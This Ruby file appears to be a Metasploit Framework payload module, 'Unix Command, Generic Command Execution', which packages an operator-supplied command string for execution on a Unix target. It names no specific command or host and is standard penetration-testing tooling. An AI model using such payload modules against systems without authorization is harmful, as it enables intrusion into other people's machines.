# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/find_shell'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  CachedSize = 8

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
                     'Name'          => 'Unix Command, Generic Command Execution',
                     'Description'   => 'Executes the supplied command',
                     'Author'        => 'hdm',
                     'License'       => MSF_LICENSE,
                     'Platform'      => 'unix',
                     'Arch'          => ARCH_CMD,
                     'Handler'       => Msf::Handler::None,
                     'Session'       => Msf::Sessions::CommandShell,
                     'PayloadType'   => 'cmd',
                     'RequiredCmd'   => 'generic',
                     'Payload'       =>
                       {
                         'Offsets' => {},
                         'Payload' => ''
                       }))

    register_options(
      [
        OptString.new('CMD', [ true, "The command string to execute" ])
      ], self.class
    )
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    datastore['CMD'] || ''
  end
end
